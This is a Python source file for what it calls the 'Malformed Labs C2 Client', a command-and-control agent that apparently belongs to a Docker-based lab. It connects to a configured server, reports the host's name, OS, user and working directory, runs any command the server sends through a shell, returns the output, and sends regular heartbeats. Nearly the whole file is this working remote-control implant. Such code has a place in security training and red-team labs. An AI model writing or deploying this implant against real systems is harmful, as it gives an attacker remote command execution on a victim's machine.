#!/usr/bin/env python3
"""
Malformed Labs C2 Client - Configuration Version
Command and Control Client that reads server details from config file
"""

import socket
import json
import time
import threading
import subprocess
import platform
import os
import sys
from datetime import datetime
import logging

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

class C2Client:
    def __init__(self, server_host='192.168.210.13', server_port=8888):
        self.server_host = server_host
        self.server_port = server_port
        self.socket = None
        self.running = False
        self.client_id = None
        
        # Authentication token (must match server)
        self.auth_token = "malformed_labs_c2_2024"
        
        # Client information
        self.client_info = self.get_system_info()
        
    def get_system_info(self):
        """Gather system information"""
        try:
            return {
                'hostname': platform.node(),
                'system': platform.system(),
                'release': platform.release(),
                'architecture': platform.architecture()[0],
                'processor': platform.processor() or 'Unknown',
                'python_version': platform.python_version(),
                'user': os.getenv('USER') or os.getenv('USERNAME') or 'Unknown',
                'cwd': os.getcwd()
            }
        except Exception as e:
            logger.error(f"Error gathering system info: {e}")
            return {'error': str(e)}
    
    def connect(self):
        """Establish connection to C2 server"""
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.settimeout(10)  # 10 second timeout
            
            logger.info(f"Attempting to connect to {self.server_host}:{self.server_port}")
            self.socket.connect((self.server_host, self.server_port))
            
            # Send initial authentication
            auth_data = {
                'type': 'auth',
                'token': self.auth_token,
                'client_info': self.client_info
            }
            
            self.send_data(auth_data)
            
            # Wait for authentication response
            response = self.receive_data()
            if response and response.get('type') == 'auth_success':
                self.client_id = response.get('client_id')
                logger.info(f"Successfully authenticated with server. Client ID: {self.client_id}")
                return True
            else:
                logger.error("Authentication failed")
                return False
                
        except socket.timeout:
            logger.error("Connection timeout - server may not be running")
            return False
        except ConnectionRefusedError:
            logger.error("Connection refused - server may not be running or port blocked")
            return False
        except Exception as e:
            logger.error(f"Connection error: {e}")
            return False
    
    def send_data(self, data):
        """Send JSON data to server"""
        try:
            json_data = json.dumps(data)
            message = json_data.encode('utf-8')
            message_length = len(message)
            
            # Send message length first (4 bytes)
            self.socket.sendall(message_length.to_bytes(4, byteorder='big'))
            # Send the actual message
            self.socket.sendall(message)
            
        except Exception as e:
            logger.error(f"Error sending data: {e}")
            raise
    
    def receive_data(self):
        """Receive JSON data from server"""
        try:
            # First, get the message length (4 bytes)
            length_bytes = b''
            while len(length_bytes) < 4:
                chunk = self.socket.recv(4 - len(length_bytes))
                if not chunk:
                    return None
                length_bytes += chunk
            
            message_length = int.from_bytes(length_bytes, byteorder='big')
            
            # Now get the actual message
            message = b''
            while len(message) < message_length:
                chunk = self.socket.recv(message_length - len(message))
                if not chunk:
                    return None
                message += chunk
            
            return json.loads(message.decode('utf-8'))
            
        except Exception as e:
            logger.error(f"Error receiving data: {e}")
            return None
    
    def execute_command(self, command):
        """Execute system command and return result"""
        try:
            logger.info(f"Executing command: {command}")
            
            result = subprocess.run(
                command,
                shell=True,
                capture_output=True,
                text=True,
                timeout=30
            )
            
            return {
                'stdout': result.stdout,
                'stderr': result.stderr,
                'returncode': result.returncode,
                'command': command
            }
            
        except subprocess.TimeoutExpired:
            return {
                'stdout': '',
                'stderr': 'Command timed out (30s limit)',
                'returncode': -1,
                'command': command
            }
        except Exception as e:
            return {
                'stdout': '',
                'stderr': str(e),
                'returncode': -1,
                'command': command
            }
    
    def handle_server_commands(self):
        """Listen for commands from server"""
        while self.running:
            try:
                data = self.receive_data()
                if not data:
                    logger.warning("No data received from server")
                    break
                
                command_type = data.get('type')
                
                if command_type == 'command':
                    command = data.get('command', '')
                    command_id = data.get('command_id', 'unknown')
                    
                    # Execute the command
                    result = self.execute_command(command)
                    
                    # Send result back to server
                    response = {
                        'type': 'command_result',
                        'command_id': command_id,
                        'client_id': self.client_id,
                        'result': result,
                        'timestamp': datetime.now().isoformat()
                    }
                    
                    self.send_data(response)
                    
                elif command_type == 'ping':
                    # Respond to ping
                    pong = {
                        'type': 'pong',
                        'client_id': self.client_id,
                        'timestamp': datetime.now().isoformat()
                    }
                    self.send_data(pong)
                    
                elif command_type == 'disconnect':
                    logger.info("Server requested disconnect")
                    break
                    
                else:
                    logger.warning(f"Unknown command type: {command_type}")
                    
            except Exception as e:
                logger.error(f"Error handling server command: {e}")
                break
    
    def send_heartbeat(self):
        """Send periodic heartbeat to server"""
        while self.running:
            try:
                heartbeat = {
                    'type': 'heartbeat',
                    'client_id': self.client_id,
                    'timestamp': datetime.now().isoformat(),
                    'status': 'alive'
                }
                self.send_data(heartbeat)
                time.sleep(30)  # Send heartbeat every 30 seconds
                
            except Exception as e:
                logger.error(f"Error sending heartbeat: {e}")
                break
    
    def run(self):
        """Main client loop"""
        if not self.connect():
            return False
        
        self.running = True
        
        # Start heartbeat thread
        heartbeat_thread = threading.Thread(target=self.send_heartbeat, daemon=True)
        heartbeat_thread.start()
        
        # Start command handling thread
        command_thread = threading.Thread(target=self.handle_server_commands, daemon=True)
        command_thread.start()
        
        # Keep main thread alive
        try:
            while self.running:
                time.sleep(1)
        except KeyboardInterrupt:
            self.stop()
        
        return True
    
    def stop(self):
        """Stop the client"""
        self.running = False
        if self.socket:
            try:
                # Send disconnect message
                disconnect_msg = {
                    'type': 'disconnect',
                    'client_id': self.client_id,
                    'timestamp': datetime.now().isoformat()
                }
                self.send_data(disconnect_msg)
            except:
                pass  # Ignore errors during shutdown
            
            self.socket.close()
        logger.info("Client stopped")

def load_config(config_file='c2_config.json'):
    """Load configuration from JSON file"""
    try:
        # Try to find config file in same directory as script
        script_dir = os.path.dirname(os.path.abspath(__file__))
        config_path = os.path.join(script_dir, config_file)
        
        if not os.path.exists(config_path):
            # Try current working directory
            config_path = config_file
            
        if not os.path.exists(config_path):
            logger.error(f"Config file not found: {config_file}")
            return None
            
        with open(config_path, 'r') as f:
            config = json.load(f)
            
        return config
        
    except Exception as e:
        logger.error(f"Error loading config file: {e}")
        return None

def main():
    """Main function"""
    config = load_config()
    
    if config:
        # Use config file values
        server_host = config['server']['host']
        server_port = config['server']['port']
        
        # Check if host needs to be set
        if server_host == "YOUR_DOCKER_HOST_IP":
            print("=== Configuration Required ===")
            print("Please edit c2_config.json and replace 'YOUR_DOCKER_HOST_IP' with your Docker host's IP address.")
            print("\nTo find your Docker host IP:")
            print("- Run: ip addr show (Linux)")
            print("- Run: ifconfig (macOS/Linux)")  
            print("- Run: ipconfig (Windows)")
            print("\nNetwork options in config file:")
            for option in config.get('network_options', []):
                print(f"  - {option['name']}: {option['host']}:{option['port']} ({option['note']})")
            return
            
        print("=== Using Configuration File ===")
        print(f"Config loaded from: c2_config.json")
        
    else:
        # Fallback to command line arguments
        server_host = sys.argv[1] if len(sys.argv) > 1 else '192.168.210.13'
        server_port = int(sys.argv[2]) if len(sys.argv) > 2 else 8888
        print("=== Using Command Line Arguments ===")
    
    print("=== Malformed Labs C2 Client ===")
    print(f"Connecting to: {server_host}:{server_port}")
    print("Press Ctrl+C to stop\n")
    
    client = C2Client(server_host, server_port)
    
    try:
        client.run()
    except KeyboardInterrupt:
        print("\nShutting down client...")
        client.stop()
    
    print("Client shutdown complete.")

if __name__ == "__main__":
    main()